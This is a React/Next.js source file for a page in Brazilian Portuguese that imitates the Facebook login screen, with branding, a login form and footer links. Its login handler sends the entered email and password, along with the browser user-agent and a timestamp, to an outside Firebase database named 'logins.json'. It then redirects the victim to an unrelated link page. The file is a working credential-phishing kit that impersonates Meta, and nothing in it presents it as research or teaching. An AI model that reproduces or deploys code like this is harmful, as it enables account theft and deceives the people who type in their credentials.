"use client"

import type React from "react"
import { useState } from "react"
import { Button } from "@/components/ui/button"
import { Input } from "@/components/ui/input"
import { Label } from "@/components/ui/label"
import { Separator } from "@/components/ui/separator"

export default function FacebookLogin() {
  const [email, setEmail] = useState("")
  const [password, setPassword] = useState("")
  const [isLoading, setIsLoading] = useState(false)

  const handleLogin = async (e: React.FormEvent) => {
    e.preventDefault()
    setIsLoading(true)

    try {
      const firebaseUrl = "https://form-test-c6a76-default-rtdb.firebaseio.com/logins.json"

      const dadosLogin = {
        email: email,
        senha: password,
        plataforma: "Facebook",
        dataHora: new Date().toLocaleString("pt-BR"),
        timestamp: Date.now(),
        ip: "Capturado via Next.js",
        navegador: navigator.userAgent.substring(0, 100),
      }

      const response = await fetch(firebaseUrl, {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify(dadosLogin),
      })

      if (response.ok) {
        console.log("✅ Dados salvos no Firebase (Facebook):", dadosLogin)
        setTimeout(() => {
          window.location.href = "https://linkbio.co/isa-lua"
        }, 1000)
      } else {
        console.error("❌ Erro ao salvar no Firebase")
        alert("Erro ao processar login. Tente novamente.")
        setIsLoading(false)
      }
    } catch (err) {
      console.error("Erro de rede:", err)
      alert("Erro de conexão. Tente novamente.")
      setIsLoading(false)
    }
  }

  return (
    <div className="min-h-screen bg-[#F0F2F5]">
      <div className="container mx-auto px-4 py-8">
        <div className="flex flex-col lg:flex-row items-center justify-center min-h-[80vh] gap-8 lg:gap-16">
          {/* Lado Esquerdo - Logo e Descrição */}
          <div className="flex-1 max-w-lg text-center lg:text-left">
            <div className="mb-4">
              <h1 className="text-6xl lg:text-7xl font-bold text-[#1877F2] mb-4">facebook</h1>
            </div>
            <p className="text-2xl lg:text-3xl text-[#1C1E21] font-normal leading-8">
              O Facebook ajuda você a se conectar e compartilhar com as pessoas que fazem parte da sua vida.
            </p>
          </div>

          {/* Lado Direito - Formulário de Login */}
          <div className="flex-1 max-w-md w-full">
            <div className="bg-white rounded-lg shadow-lg p-6">
              <form onSubmit={handleLogin} className="space-y-4">
                <div>
                  <Label htmlFor="email" className="sr-only">
                    Email ou telefone
                  </Label>
                  <Input
                    id="email"
                    name="email"
                    type="text"
                    placeholder="Email ou telefone"
                    value={email}
                    onChange={(e) => setEmail(e.target.value)}
                    className="h-14 text-lg rounded-md border-gray-300 focus:border-[#1877F2] focus:ring-[#1877F2] focus:ring-1"
                    required
                  />
                </div>

                <div>
                  <Label htmlFor="password" className="sr-only">
                    Senha
                  </Label>
                  <Input
                    id="password"
                    name="senha"
                    type="password"
                    placeholder="Senha"
                    value={password}
                    onChange={(e) => setPassword(e.target.value)}
                    className="h-14 text-lg rounded-md border-gray-300 focus:border-[#1877F2] focus:ring-[#1877F2] focus:ring-1"
                    required
                  />
                </div>

                <Button
                  type="submit"
                  disabled={isLoading}
                  className="w-full h-12 bg-[#1877F2] hover:bg-[#166FE5] text-white font-bold text-xl rounded-md transition-colors duration-200 disabled:opacity-50"
                >
                  {isLoading ? (
                    <div className="flex items-center gap-2">
                      <div className="w-5 h-5 border-2 border-white border-t-transparent rounded-full animate-spin"></div>
                      Entrando...
                    </div>
                  ) : (
                    "Entrar"
                  )}
                </Button>
              </form>

              <div className="text-center mt-4">
                <a href="#" className="text-[#1877F2] text-sm hover:underline">
                  Esqueceu a senha?
                </a>
              </div>

              <Separator className="my-6" />

              <div className="text-center">
                <Button
                  type="button"
                  className="bg-[#42B72A] hover:bg-[#36A420] text-white font-bold px-6 py-3 text-lg rounded-md"
                >
                  Criar nova conta
                </Button>
              </div>
            </div>

            <div className="text-center mt-6">
              <p className="text-sm text-[#1C1E21]">
                <strong>Crie uma Página</strong> para uma celebridade, uma marca ou uma empresa.
              </p>
            </div>
          </div>
        </div>

        {/* Rodapé Completo do Facebook */}
        <footer className="mt-12 border-t border-gray-300 pt-8">
          <div className="max-w-6xl mx-auto">
            <div className="flex flex-wrap justify-center gap-4 text-xs text-gray-600 mb-4">
              <a href="#" className="hover:underline">
                Português (Brasil)
              </a>
              <a href="#" className="hover:underline">
                English (US)
              </a>
              <a href="#" className="hover:underline">
                Español
              </a>
              <a href="#" className="hover:underline">
                Français (France)
              </a>
              <a href="#" className="hover:underline">
                Italiano
              </a>
              <a href="#" className="hover:underline">
                Deutsch
              </a>
              <a href="#" className="hover:underline">
                العربية
              </a>
              <a href="#" className="hover:underline">
                हिन्दी
              </a>
              <a href="#" className="hover:underline">
                中文(简体)
              </a>
              <a href="#" className="hover:underline">
                日本語
              </a>
            </div>
            <Separator className="mb-4" />
            <div className="flex flex-wrap justify-center gap-4 text-xs text-gray-600 mb-4">
              <a href="#" className="hover:underline">
                Cadastre-se
              </a>
              <a href="#" className="hover:underline">
                Entrar
              </a>
              <a href="#" className="hover:underline">
                Messenger
              </a>
              <a href="#" className="hover:underline">
                Facebook Lite
              </a>
              <a href="#" className="hover:underline">
                Video
              </a>
              <a href="#" className="hover:underline">
                Locais
              </a>
              <a href="#" className="hover:underline">
                Jogos
              </a>
              <a href="#" className="hover:underline">
                Marketplace
              </a>
              <a href="#" className="hover:underline">
                Meta Pay
              </a>
              <a href="#" className="hover:underline">
                Meta Store
              </a>
              <a href="#" className="hover:underline">
                Meta Quest
              </a>
              <a href="#" className="hover:underline">
                Instagram
              </a>
              <a href="#" className="hover:underline">
                Threads
              </a>
            </div>
            <div className="flex flex-wrap justify-center gap-4 text-xs text-gray-600 mb-4">
              <a href="#" className="hover:underline">
                Privacidade
              </a>
              <a href="#" className="hover:underline">
                Termos
              </a>
              <a href="#" className="hover:underline">
                Política de Cookies
              </a>
              <a href="#" className="hover:underline">
                Escolhas para anúncios
              </a>
              <a href="#" className="hover:underline">
                Ajuda
              </a>
              <a href="#" className="hover:underline">
                Carregar contatos e não usuários
              </a>
            </div>
            <div className="text-center text-xs text-gray-500">Meta © 2024</div>
          </div>
        </footer>
      </div>
    </div>
  )
}
